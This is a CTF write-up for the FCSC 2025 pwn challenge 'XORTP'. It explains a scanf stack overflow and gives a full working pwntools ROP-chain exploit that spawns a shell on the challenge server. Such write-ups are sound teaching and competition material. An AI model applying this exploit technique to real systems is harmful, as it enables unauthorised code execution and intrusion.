# Write-up XORTP

Author: Nuliel

Pwn challenge, FCSC 2025

## Problem statement

> You can encrypt any file on the system with an unbreakable mechanism worthy of the greatest!

Two files are attached to the challenge: xortp and xortp.c

## Solution

Let's check the protections on this binary:

```
❯ checksec xortp
[*] '/home/nuliel/ctf/FCSC2025/WU/xortp/xortp'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

There is a buffer overflow on the line 

```
scanf("%s", filename);
```

With gdb and cyclic from pwntools, we can find the offset of saved rip: 152.

Because of NX, we can't put and execute a shellcode from stack. As PIE is not enabled, we can use gadgets from the binary to make a ROP chain. 

We will call execve syscall, so we need:
- rax = 0x3b (syscall number)
- rdi = pointer to /bin/sh (first argument)
- rsi = pointer to argv, will be 0 (second argument)
- rdx = pointer to envp, will be 0 (third argument)
- gadgets for setting each register, and a syscall gadget
- a /bin/sh with known address

From
```
ROPgadget --binary ./xortp
```

we can see these gadgets:

| Address (in hex)   | gadget                            |
|--------------------|-----------------------------------|
| 0x00000000004867a6 | pop rax ; pop rdx ; pop rbx ; ret |
| 0x00000000004011a2 | syscall                           |
| 0x000000000040f972 | pop rsi ; ret                     |
| 0x0000000000401f60 | pop rdi ; ret                     |

We can find the string "/bin/sh" in the binary, at address 00498213 (in .rodata section)

We can use all these informations to get a shell:

```py
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

# gadgets

# 0x00000000004867a6 : pop rax ; pop rdx ; pop rbx ; ret
# 0x00000000004011a2 : syscall
# 0x000000000040f972 : pop rsi ; ret
# 0x0000000000401f60 : pop rdi ; ret

# 00498213 => /bin/sh in .rodata

pop_rax_rdx_rbx = 0x00000000004867a6
pop_rsi = 0x000000000040f972
pop_rdi = 0x0000000000401f60
addr_bin_sh = 0x00498213
syscall_gadget = 0x00000000004011a2

gdbscript = """
c
"""

io = remote("chall.fcsc.fr", 2105)
# io = gdb.debug("./xortp", gdbscript = gdbscript)

# offset 152: saved rip
# offset 144: saved rbp
io.sendline(cyclic(152) + \
            p64(pop_rdi) + p64(addr_bin_sh) + \
            p64(pop_rsi) + p64(0) + \
            p64(pop_rax_rdx_rbx) + p64(0x3b) + p64(0) + p64(0) + \
            p64(syscall_gadget)
                )
io.interactive()
```

Reference: 
- https://syscalls.mebeim.net/?table=x86/64/x64/latest